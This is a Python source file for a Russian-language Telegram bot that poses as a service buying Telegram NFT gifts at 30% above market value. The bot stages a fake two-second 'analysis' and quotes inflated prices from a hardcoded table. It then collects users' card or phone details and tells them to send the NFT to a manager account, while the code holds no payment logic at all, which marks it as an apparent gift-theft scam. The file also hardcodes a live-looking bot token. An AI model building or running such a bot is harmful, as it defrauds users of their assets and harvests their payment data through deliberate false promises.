import logging
import re
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import json
import os
from datetime import datetime
import asyncio

# Настройка логирования
logging.basicConfig(
    format='%(astime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфигурация
TOKEN = "8646107306:AAGlmH0RcrrPg39pakoM7RXI8BEWpl9FmwM"
ADMIN_IDS = []  # Добавьте свой ID
MANAGER_USERNAME = "buyer_supportz"  # Юзернейм менеджера

# Путь к файлу с фото (должен лежать в той же папке)
PHOTO_FILE = "bot_photo.jpg"

# База данных
DATA_FILE = "data.json"

# База цен подарков (обновленные цены)
GIFT_PRICES = {
    # Название подарка: (цена_в_рублях, цена_в_звездах)
    "artisanbrick": (22500, 12500),
    "astralshard": (46250, 25694),
    "bdaycandle": (962, 534),
    "berrybox": (1975, 1097),
    "bigyear": (1000, 556),
    "blingbinky": (7910, 4394),
    "bondedring": (12000, 6667),
    "bowtie": (1422, 790),
    "bunnymuffin": (1620, 900),
    "candycane": (982, 546),
    "cloverpin": (1092, 607),
    "cookieheart": (1145, 636),
    "crystalball": (2737, 1521),
    "cupidcharm": (4962, 2757),
    "deskcalendar": (1425, 792),
    "diamondring": (7050, 3917),
    "durovscap": (171250, 95139),
    "easteregg": (1287, 715),
    "electricskull": (7247, 4026),
    "eternalcandle": (1550, 861),
    "eternalrose": (6250, 3472),
    "evileye": (1697, 943),
    "faithamulet": (1092, 607),
    "flyingbroom": (2962, 1646),
    "freshsocks": (1065, 592),
    "gemsignet": (16197, 8998),
    "genielamp": (12250, 6806),
    "gingercookie": (1035, 575),
    "hangingstar": (2022, 1123),
    "happybrownie": (1040, 578),
    "heartlocket": (433000, 240556),
    "heroichelmet": (53962, 29979),
    "hexpot": (1117, 621),
    "holidaydrink": (1015, 564),
    "homemadecake": (1065, 592),
    "hypnolollipop": (1040, 578),
    "icecream": (987, 548),
    "inputkey": (1377, 765),
    "instantramen": (1005, 558),
    "iongem": (22500, 12500),
    "ionicdryer": (4075, 2264),
    "jackinthebox": (1092, 607),
    "jellybunny": (1750, 972),
    "jesterhat": (1040, 578),
    "jinglebells": (2025, 1125),
    "jollychimp": (1700, 944),
    "joyfulbundle": (1610, 894),
    "khabibspapakha": (5997, 3332),
    "kissedfrog": (14250, 7917),
    "lightsword": (1405, 781),
    "lolpop": (1047, 582),
    "lootbag": (37000, 20556),
    "lovecandle": (2375, 1319),
    "lovepotion": (3770, 2094),
    "lowrider": (11980, 6656),
    "lunarsnake": (957, 532),
    "lushbouquet": (1405, 781),
    "madpumpkin": (3000, 1667),
    "magicpotion": (18747, 10415),
    "mightyarm": (39250, 21806),
    "minioscar": (22997, 12776),
    "moneypot": (1087, 604),
    "moonpendant": (1150, 639),
    "moussecake": (1015, 564),
    "nailbracelet": (32500, 18056),
    "nekohelmet": (9250, 5139),
    "partysparkler": (975, 542),
    "perfumebottle": (22750, 12639),
    "petsnake": (987, 548),
    "plushpepe": (1737250, 965139),
    "preciouspeach": (99247, 55137),
    "prettyposy": (1090, 606),
    "rarebird": (7122, 3957),
    "recordplayer": (3375, 1875),
    "restlessjar": (1147, 637),
    "sakuraflower": (2340, 1300),
    "santahat": (1065, 592),
    "scaredcat": (38500, 21389),
    "sharptongue": (11250, 6250),
    "signetring": (8125, 4514),
    "skullflower": (2600, 1444),
    "skystilettos": (3650, 2028),
    "sleighbell": (2080, 1156),
    "snakebox": (910, 506),
    "snoopcigar": (2850, 1583),
    "snoopdogg": (1170, 650),
    "snowglobe": (1170, 650),
    "snowmittens": (1560, 867),
    "spicedwine": (1142, 634),
    "springbasket": (1300, 722),
    "spyagaric": (1262, 701),
    "starnotepad": (1125, 625),
    "stellarrocket": (1117, 621),
    "swagbag": (1170, 650),
    "swisswatch": (11930, 6628),
    "tamagadget": (1027, 571),
    "tophat": (2620, 1456),
    "toybear": (10400, 5778),
    "trappedheart": (3225, 1792),
    "ufcstrike": (3425, 1903),
    "valentinebox": (2470, 1372),
    "victorymedal": (1102, 612),
    "vintagecigar": (8100, 4500),
    "voodoodoll": (7375, 4097),
    "westsidesign": (24997, 13887),
    "whipcupcake": (987, 548),
    "winterwreath": (1040, 578),
    "witchhat": (1300, 722),
    "xmasstocking": (985, 547),
}

# Синонимы названий (разные варианты написания)
GIFT_SYNONYMS = {
    "durov's cap": "durovscap",
    "durovscap": "durovscap",
    "heart locket": "heartlocket",
    "heartlocket": "heartlocket",
    "plush pepe": "plushpepe",
    "plushpepe": "plushpepe",
    "rare bird": "rarebird",
    "rarebird": "rarebird",
}

# ============================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ДЛЯ РАБОТЫ С ФОТО
# ============================================

async def send_with_photo(chat_id, text, context, reply_markup=None, photo_file=PHOTO_FILE):
    """Отправляет новое сообщение с фото"""
    try:
        if os.path.exists(photo_file):
            with open(photo_file, 'rb') as photo:
                await context.bot.send_photo(
                    chat_id=chat_id,
                    photo=photo,
                    caption=text,
                    reply_markup=reply_markup,
                    parse_mode='Markdown'
                )
            logger.info(f"Фото отправлено пользователю {chat_id}")
        else:
            logger.warning(f"Файл {photo_file} не найден, отправляем без фото")
            await context.bot.send_message(
                chat_id=chat_id,
                text=text,
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
    except Exception as e:
        logger.error(f"Ошибка при отправке фото: {e}")
        await context.bot.send_message(
            chat_id=chat_id,
            text=text,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

async def edit_message(query, text, reply_markup=None):
    """Редактирует существующее сообщение"""
    try:
        # Проверяем тип сообщения
        if query.message.photo:
            # Если это сообщение с фото - редактируем подпись
            await query.edit_message_caption(
                caption=text,
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            logger.info("Отредактирована подпись к фото")
        elif query.message.text:
            # Если это обычное сообщение - редактируем текст
            await query.edit_message_text(
                text=text,
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            logger.info("Отредактировано текстовое сообщение")
        else:
            # Если ничего нет - отправляем новое
            logger.warning("Неизвестный тип сообщения, отправляем новое")
            await query.message.reply_text(
                text=text,
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
    except Exception as e:
        logger.error(f"Ошибка при редактировании: {e}")
        # Пробуем отправить новое сообщение
        await query.message.reply_text(
            text=text,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

# ============================================
# ОСНОВНЫЕ ФУНКЦИИ БОТА
# ============================================

def normalize_gift_name(name):
    """Нормализует название подарка для поиска в базе"""
    # Приводим к нижнему регистру и убираем лишние символы
    normalized = re.sub(r'[^a-z0-9]', '', name.lower())
    
    # Проверяем синонимы
    for synonym, original in GIFT_SYNONYMS.items():
        if synonym.replace("'", "").replace(" ", "") in normalized:
            return original
    
    return normalized

def get_gift_price(gift_name):
    """Получает цену подарка по названию"""
    normalized = normalize_gift_name(gift_name)
    
    # Прямое совпадение
    if normalized in GIFT_PRICES:
        return GIFT_PRICES[normalized]
    
    # Поиск по частичному совпадению
    for key, price in GIFT_PRICES.items():
        if key in normalized or normalized in key:
            return price
    
    return None

# Класс для оценки NFT по ссылке
class NFTParser:
    # Регулярное выражение для ссылок на NFT подарки
    NFT_PATTERN = r'https?://t\.me/nft/([a-zA-Z0-9_-]+)-(\d+)'
    
    @classmethod
    def parse_nft_link(cls, link):
        """Парсит ссылку на NFT и возвращает название и номер"""
        match = re.match(cls.NFT_PATTERN, link)
        if match:
            return {
                'name': match.group(1),
                'number': match.group(2),
                'full_link': link
            }
        return None

# Обработчики команд
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    context.user_data.clear()
    context.user_data['state'] = 'main'
    
    # Сохраняем пользователя
    data = load_data()
    if str(user.id) not in data["users"]:
        data["users"][str(user.id)] = {
            "username": user.username,
            "first_name": user.first_name,
            "joined_date": datetime.now().isoformat()
        }
        save_data(data)
    
    welcome_text = (
        f"🌟 Добро пожаловать в Автоматическую Скупку NFT-подарков в Telegram, {user.first_name}!\n\n"
        "Мы - профессиональный сервис по выкупу NFT-подарков выше рыночной стоимости.\n\n"
        "🤖 Наш бот автоматически оценивает ваш NFT по ссылке и предлагает цену на 30% выше рынка\n\n"
        "✅ Тысячи успешных сделок\n"
        "⚡ Быстрые выплаты\n"
        "🔒 Полная безопасность\n\n"
        "Выберите действие ниже:"
    )
    
    keyboard = [
        [InlineKeyboardButton("💰 Продать NFT", callback_data='sell')],
        [InlineKeyboardButton("📋 Как проводится сделка?", callback_data='how_it_works')],
        [InlineKeyboardButton("🆘 Поддержка", callback_data='support')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Отправляем приветствие с фото
    await send_with_photo(
        chat_id=update.effective_chat.id,
        text=welcome_text,
        context=context,
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    # Логируем нажатие кнопки
    logger.info(f"Нажата кнопка: {query.data} от пользователя {query.from_user.id}")
    
    if query.data == 'sell':
        await start_selling(query, context)
    elif query.data == 'how_it_works':
        await show_instructions(query, context)
    elif query.data == 'support':
        await show_support(query, context)
    elif query.data == 'payment_rub':
        await select_payment_rub(query, context)
    elif query.data == 'payment_stars':
        await select_payment_stars(query, context)
    elif query.data == 'back_to_payment':
        await back_to_payment(query, context)
    elif query.data == 'back_to_main':
        await back_to_main(query, context)
    elif query.data == 'check_another':
        await check_another(query, context)
    elif query.data == 'cancel_sale':
        await cancel_sale(query, context)
    elif query.data == 'confirm_deal':
        await confirm_deal(query, context)
    elif query.data == 'reject_deal':
        await reject_deal(query, context)
    elif query.data == 'gift_sent':
        await gift_sent(query, context)

async def start_selling(query, context):
    """Начало процесса продажи - запрос ссылки"""
    context.user_data['state'] = 'waiting_for_link'
    
    text = (
        "🔗 Отправьте ссылку на ваш NFT-подарок\n\n"
        "Формат: https://t.me/nft/НАЗВАНИЕ-НОМЕР\n\n"
        "📌 Примеры:\n"
        "• https://t.me/nft/DurovsCap-1\n"
        "• https://t.me/nft/HeartLocket-2\n"
        "• https://t.me/nft/PlushPepe-3\n\n"
        "⚠️ Принимаются только NFT-подарки Telegram"
    )
    
    keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data='back_to_main')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Редактируем существующее сообщение
    await edit_message(query, text, reply_markup)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Единый обработчик всех текстовых сообщений"""
    text = update.message.text.strip()
    current_state = context.user_data.get('state')
    
    # Если ждем ссылку
    if current_state == 'waiting_for_link':
        await handle_nft_link(update, context)
    
    # Если ждем реквизиты
    elif current_state == 'awaiting_details':
        await handle_payment_details(update, context)
    
    # В любом другом случае игнорируем

async def handle_nft_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка полученной ссылки на NFT"""
    link = update.message.text.strip()
    
    # Парсим ссылку
    nft_data = NFTParser.parse_nft_link(link)
    
    if not nft_data:
        text = (
            "❌ Неправильный формат ссылки!\n\n"
            "Формат: https://t.me/nft/НАЗВАНИЕ-НОМЕР\n\n"
            "📌 Примеры правильных ссылок:\n"
            "• https://t.me/nft/DurovsCap-1\n"
            "• https://t.me/nft/HeartLocket-2\n"
            "• https://t.me/nft/PlushPepe-3\n\n"
            "Попробуйте снова:"
        )
        
        keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data='back_to_main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Отправляем ответ с фото
        await send_with_photo(
            chat_id=update.effective_chat.id,
            text=text,
            context=context,
            reply_markup=reply_markup
        )
        return
    
    # Отправляем сообщение о начале анализа
    analyzing_msg = await update.message.reply_text(
        "🔍 Анализируем ваш NFT...\nПожалуйста, подождите несколько секунд."
    )
    
    # Имитируем процесс анализа
    await asyncio.sleep(2)
    
    # Получаем цену подарка из базы
    price_info = get_gift_price(nft_data['name'])
    
    if not price_info:
        # Если подарок не найден в базе
        await analyzing_msg.delete()
        text = (
            "❌ Подарок не найден в нашей базе!\n\n"
            f"Название: {nft_data['name']}\n\n"
            "Пожалуйста, проверьте правильность названия или обратитесь к менеджеру для ручной оценки."
        )
        keyboard = [[InlineKeyboardButton("🔄 Попробовать другой", callback_data='check_another')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await send_with_photo(
            chat_id=update.effective_chat.id,
            text=text,
            context=context,
            reply_markup=reply_markup
        )
        return
    
    market_rub, market_stars = price_info
    our_rub = round(market_rub * 1.3)
    our_stars = round(market_stars * 1.3)
    
    # Сохраняем данные
    context.user_data['nft_info'] = {
        'link': nft_data['full_link'],
        'name': nft_data['name'],
        'number': nft_data['number'],
        'market_rub': market_rub,
        'market_stars': market_stars,
        'our_rub': our_rub,
        'our_stars': our_stars
    }
    
    # Удаляем сообщение об анализе
    await analyzing_msg.delete()
    
    # Показываем результат оценки
    text = (
        "✅ Анализ NFT завершён!\n\n"
        f"📎 Ваш NFT: {nft_data['full_link']}\n"
        f"🏷 Рыночная стоимость: {market_rub:,} ₽ / {market_stars:,} ⭐️\n"
        f"💰 Наше предложение (+30%): {our_rub:,} ₽ / {our_stars:,} ⭐️\n\n"
        "Выберите способ получения оплаты:"
    )
    
    keyboard = [
        [InlineKeyboardButton("🇷🇺 Карта — Россия (RUB)", callback_data='payment_rub')],
        [InlineKeyboardButton("⭐️ Звезды (Telegram Stars)", callback_data='payment_stars')],
        [InlineKeyboardButton("🔄 Проверить другой NFT", callback_data='check_another')],
        [InlineKeyboardButton("❌ Отмена", callback_data='cancel_sale')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Отправляем результат с фото
    await send_with_photo(
        chat_id=update.effective_chat.id,
        text=text,
        context=context,
        reply_markup=reply_markup
    )
    
    # Меняем состояние
    context.user_data['state'] = 'awaiting_payment'

async def select_payment_rub(query, context):
    """Выбор оплаты в рублях"""
    context.user_data['payment_method'] = 'rub'
    context.user_data['payment_name'] = '🇷🇺 Карта — Россия (RUB)'
    context.user_data['state'] = 'awaiting_details'
    
    nft_info = context.user_data.get('nft_info', {})
    
    text = (
        f"💳 Способ оплаты: 🇷🇺 Карта — Россия (RUB)\n\n"
        f"📎 Ваш NFT: {nft_info.get('link')}\n"
        f"🏷 Рыночная стоимость: ~{nft_info.get('market_rub'):,} ₽\n"
        f"💰 Наше предложение: {nft_info.get('our_rub'):,} ₽ (+30%)\n\n"
        "📝 Введите ваши реквизиты для получения оплаты:\n"
        "(Номер карты, телефон и т.д.)"
    )
    
    keyboard = [[InlineKeyboardButton("◀️ Назад к выбору оплаты", callback_data='back_to_payment')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Редактируем сообщение (текст меняется, фото остается)
    await edit_message(query, text, reply_markup)

async def select_payment_stars(query, context):
    """Выбор оплаты в звездах"""
    context.user_data['payment_method'] = 'stars'
    context.user_data['payment_name'] = '⭐️ Звезды (Telegram Stars)'
    context.user_data['state'] = 'awaiting_details'
    
    nft_info = context.user_data.get('nft_info', {})
    
    text = (
        f"💳 Способ оплаты: ⭐️ Звезды (Telegram Stars)\n\n"
        f"📎 Ваш NFT: {nft_info.get('link')}\n"
        f"🏷 Рыночная стоимость: ~{nft_info.get('market_stars'):,} ⭐️\n"
        f"💰 Наше предложение: {nft_info.get('our_stars'):,} ⭐️ (+30%)\n\n"
        "📝 Введите ваш @username для получения оплаты:"
    )
    
    keyboard = [[InlineKeyboardButton("◀️ Назад к выбору оплаты", callback_data='back_to_payment')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Редактируем сообщение (текст меняется, фото остается)
    await edit_message(query, text, reply_markup)

async def back_to_payment(query, context):
    """Возврат к выбору оплаты"""
    nft_info = context.user_data.get('nft_info', {})
    context.user_data['state'] = 'awaiting_payment'
    
    text = (
        "✅ Анализ NFT завершён!\n\n"
        f"📎 Ваш NFT: {nft_info.get('link')}\n"
        f"🏷 Рыночная стоимость: {nft_info.get('market_rub'):,} ₽ / {nft_info.get('market_stars'):,} ⭐️\n"
        f"💰 Наше предложение (+30%): {nft_info.get('our_rub'):,} ₽ / {nft_info.get('our_stars'):,} ⭐️\n\n"
        "Выберите способ получения оплаты:"
    )
    
    keyboard = [
        [InlineKeyboardButton("🇷🇺 Карта — Россия (RUB)", callback_data='payment_rub')],
        [InlineKeyboardButton("⭐️ Звезды (Telegram Stars)", callback_data='payment_stars')],
        [InlineKeyboardButton("🔄 Проверить другой NFT", callback_data='check_another')],
        [InlineKeyboardButton("❌ Отмена", callback_data='cancel_sale')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Редактируем сообщение
    await edit_message(query, text, reply_markup)

async def handle_payment_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка введенных реквизитов"""
    details = update.message.text.strip()
    context.user_data['payment_details'] = details
    
    nft_info = context.user_data.get('nft_info', {})
    payment_method = context.user_data.get('payment_method')
    payment_name = context.user_data.get('payment_name')
    
    if payment_method == 'rub':
        amount = nft_info.get('our_rub')
        market = nft_info.get('market_rub')
        currency = '₽'
    else:
        amount = nft_info.get('our_stars')
        market = nft_info.get('market_stars')
        currency = '⭐️'
    
    text = (
        f"📎 Ваш NFT: {nft_info.get('link')}\n"
        f"💳 Способ оплаты: {payment_name}\n\n"
        f"🏷 Рыночная стоимость: ~{market:,} {currency}\n"
        f"💰 Наше предложение: {amount:,} {currency}\n\n"
        f"💬 Я предлагаю вам за ваш NFT {nft_info.get('link')} сумму {amount:,} {currency}\n\n"
        "Если согласны — нажмите Да, если нет — Нет 👇"
    )
    
    keyboard = [
        [InlineKeyboardButton("✅ Да", callback_data='confirm_deal')],
        [InlineKeyboardButton("❌ Нет", callback_data='reject_deal')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Отправляем результат с фото
    await send_with_photo(
        chat_id=update.effective_chat.id,
        text=text,
        context=context,
        reply_markup=reply_markup
    )
    context.user_data['state'] = 'awaiting_confirmation'

async def confirm_deal(query, context):
    """Подтверждение сделки"""
    nft_info = context.user_data.get('nft_info', {})
    payment_method = context.user_data.get('payment_method')
    payment_name = context.user_data.get('payment_name')
    payment_details = context.user_data.get('payment_details')
    
    if payment_method == 'rub':
        amount = nft_info.get('our_rub')
        currency = '₽'
    else:
        amount = nft_info.get('our_stars')
        currency = '⭐️'
    
    # Сохраняем транзакцию
    data = load_data()
    transaction = {
        "id": len(data["transactions"]) + 1,
        "user_id": query.from_user.id,
        "username": query.from_user.username,
        "nft_link": nft_info.get('link'),
        "nft_name": nft_info.get('name'),
        "nft_number": nft_info.get('number'),
        "payment_method": payment_method,
        "payment_name": payment_name,
        "payment_details": payment_details,
        "amount": amount,
        "currency": currency,
        "status": "confirmed",
        "created_at": datetime.now().isoformat()
    }
    data["transactions"].append(transaction)
    save_data(data)
    
    text = (
        f"✅ Отлично!\n\n"
        f"Теперь вам нужно отправить ваш NFT менеджеру @{MANAGER_USERNAME}\n\n"
        f"📎 NFT: {nft_info.get('link')}\n"
        f"💵 Сумма выплаты: {amount:,} {currency}\n"
        f"💳 Способ оплаты: {payment_name}\n\n"
        f"Менеджер проверит подарок и переведёт оплату на ваши реквизиты.\n"
        f"⚡️ Среднее время сделки: 5–15 минут\n\n"
        f"⚠️ Важно: передавайте NFT ТОЛЬКО через @{MANAGER_USERNAME}. "
        f"Мы не несём ответственности за сделки вне официального канала."
    )
    
    # Добавляем кнопку "Подарок передан"
    keyboard = [
        [InlineKeyboardButton("✅ Подарок передан", callback_data='gift_sent')],
        [InlineKeyboardButton("🏠 В главное меню", callback_data='back_to_main')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Редактируем сообщение
    await edit_message(query, text, reply_markup)

async def gift_sent(query, context):
    """Обработчик кнопки 'Подарок передан'"""
    nft_info = context.user_data.get('nft_info', {})
    payment_method = context.user_data.get('payment_method')
    
    if payment_method == 'rub':
        amount = nft_info.get('our_rub')
        currency = '₽'
    else:
        amount = nft_info.get('our_stars')
        currency = '⭐️'
    
    # Обновляем статус транзакции
    data = load_data()
    for t in data["transactions"]:
        if t.get("nft_link") == nft_info.get('link') and t.get("user_id") == query.from_user.id:
            t["status"] = "gift_sent"
            t["gift_sent_at"] = datetime.now().isoformat()
            break
    save_data(data)
    
    text = (
        f"✅ Спасибо! Менеджер уведомлен о передаче подарка.\n\n"
        f"📎 NFT: {nft_info.get('link')}\n"
        f"💵 Сумма выплаты: {amount:,} {currency}\n\n"
        f"Ожидайте поступления оплаты в течение 5–15 минут.\n"
        f"Если возникнут вопросы, обращайтесь к @{MANAGER_USERNAME}"
    )
    
    keyboard = [[InlineKeyboardButton("🏠 В главное меню", callback_data='back_to_main')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Редактируем сообщение
    await edit_message(query, text, reply_markup)
    
    # Уведомление админам о том, что подарок передан
    for admin_id in ADMIN_IDS:
        try:
            admin_text = (
                f"📦 Подарок передан!\n\n"
                f"👤 Пользователь: @{query.from_user.username}\n"
                f"🆔 ID: {query.from_user.id}\n"
                f"📎 NFT: {nft_info.get('link')}\n"
                f"💰 Сумма: {amount:,} {currency}\n"
                f"⏰ Время: {datetime.now().strftime('%d.%m.%Y %H:%M')}"
            )
            await context.bot.send_message(admin_id, admin_text, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Failed to notify admin {admin_id}: {e}")
    
    context.user_data.clear()

async def reject_deal(query, context):
    """Отмена сделки"""
    text = "❌ Сделка отменена. Возвращаемся в главное меню."
    
    keyboard = [[InlineKeyboardButton("🏠 В главное меню", callback_data='back_to_main')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Редактируем сообщение
    await edit_message(query, text, reply_markup)
    context.user_data.clear()

async def check_another(query, context):
    """Проверка другого NFT"""
    context.user_data['state'] = 'waiting_for_link'
    
    text = (
        "🔗 Отправьте ссылку на другой NFT-подарок\n\n"
        "Формат: https://t.me/nft/НАЗВАНИЕ-НОМЕР\n\n"
        "📌 Примеры:\n"
        "• https://t.me/nft/DurovsCap-1\n"
        "• https://t.me/nft/HeartLocket-2\n"
        "• https://t.me/nft/PlushPepe-3"
    )
    
    keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data='back_to_main')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Редактируем сообщение
    await edit_message(query, text, reply_markup)

async def cancel_sale(query, context):
    """Отмена продажи"""
    text = "❌ Продажа отменена. Возвращаемся в главное меню."
    
    keyboard = [[InlineKeyboardButton("🏠 В главное меню", callback_data='back_to_main')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Редактируем сообщение
    await edit_message(query, text, reply_markup)
    context.user_data.clear()

async def show_instructions(query, context):
    """Инструкция по сделке"""
    instructions = (
        "🤝 Как проводится сделка:\n\n"
        "1. Вы присылаете ссылку на NFT-подарок\n"
        "2. Бот находит цену в базе данных\n"
        "3. Вы выбираете способ оплаты\n"
        "4. Бот озвучивает свою сумму в вашей валюте (+30%)\n\n"
        "Пример: Я предлагаю вам за ваш NFT https://t.me/nft/HeartLocket-2 — 562,900 Рублей\n"
        "Если согласны — нажмите Да, если нет — Нет\n\n"
        "5. При согласии — отправьте NFT менеджеру @buyer_supportz\n"
        "6. Менеджер проверяет подарок и переводит оплату на ваши реквизиты\n\n"
        "⚡️ Среднее время сделки: 5–15 минут"
    )
    
    keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data='back_to_main')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Редактируем сообщение
    await edit_message(query, instructions, reply_markup)

async def show_support(query, context):
    """Поддержка"""
    support_text = (
        "🆘 Поддержка\n\n"
        f"По всем вопросам обращайтесь к менеджеру @{MANAGER_USERNAME}\n\n"
        "⏰ Время работы: 24/7\n\n"
        "Среднее время ответа: 5-10 минут"
    )
    
    keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data='back_to_main')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Редактируем сообщение
    await edit_message(query, support_text, reply_markup)

async def back_to_main(query, context):
    """Возврат в главное меню"""
    context.user_data.clear()
    
    user = query.from_user
    first_name = user.first_name
    
    welcome_text = (
        f"🌟 Добро пожаловать в Автоматическую Скупку NFT-подарков в Telegram, {first_name}!\n\n"
        "Мы - профессиональный сервис по выкупу NFT-подарков выше рыночной стоимости.\n\n"
        "🤖 Наш бот автоматически оценивает ваш NFT по ссылке и предлагает цену на 30% выше рынка\n\n"
        "✅ Тысячи успешных сделок\n"
        "⚡ Быстрые выплаты\n"
        "🔒 Полная безопасность\n\n"
        "Выберите действие ниже:"
    )
    
    keyboard = [
        [InlineKeyboardButton("💰 Продать NFT", callback_data='sell')],
        [InlineKeyboardButton("📋 Как проводится сделка?", callback_data='how_it_works')],
        [InlineKeyboardButton("🆘 Поддержка", callback_data='support')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Редактируем сообщение
    await edit_message(query, welcome_text, reply_markup)

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Статистика для админов"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ У вас нет прав для этой команды.")
        return
    
    data = load_data()
    total_users = len(data["users"])
    total_transactions = len(data["transactions"])
    pending = sum(1 for t in data["transactions"] if t["status"] == "pending")
    confirmed = sum(1 for t in data["transactions"] if t["status"] == "confirmed")
    gift_sent = sum(1 for t in data["transactions"] if t["status"] == "gift_sent")
    
    stats = (
        f"📊 Статистика бота\n\n"
        f"👥 Пользователей: {total_users}\n"
        f"📦 Всего транзакций: {total_transactions}\n"
        f"⏳ В обработке: {pending}\n"
        f"✅ Подтверждено: {confirmed}\n"
        f"📤 Подарков передано: {gift_sent}\n"
    )
    
    await update.message.reply_text(stats, parse_mode='Markdown')

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"users": {}, "transactions": []}

def save_data(data):
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def main():
    print("=" * 50)
    print("ЗАПУСК БОТА ДЛЯ СКУПКИ NFT")
    print("=" * 50)
    print(f"Токен: {TOKEN[:10]}...")
    print(f"Менеджер: @{MANAGER_USERNAME}")
    
    # Проверяем наличие фото
    if os.path.exists(PHOTO_FILE):
        print(f"✅ Фото найдено: {PHOTO_FILE}")
    else:
        print(f"⚠️ Фото {PHOTO_FILE} не найдено, бот будет работать без изображений")
    
    try:
        # Создание приложения
        application = Application.builder().token(TOKEN).build()
        
        # Регистрация обработчиков
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("stats", admin_stats))
        application.add_handler(CallbackQueryHandler(button_handler))
        
        # Единый обработчик для всех текстовых сообщений
        application.add_handler(MessageHandler(
            filters.TEXT & ~filters.COMMAND, 
            handle_message
        ))
        
        print("✅ Бот успешно инициализирован!")
        print("🚀 Запуск polling...")
        
        # Запуск бота
        application.run_polling(
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True
        )
        
    except Exception as e:
        print(f"❌ Ошибка при запуске: {e}")
        print("\nПроверьте:")
        print("1. Правильность токена")
        print("2. Интернет-соединение")
        print("3. Не заблокирован ли Telegram")

if __name__ == '__main__':
    main()
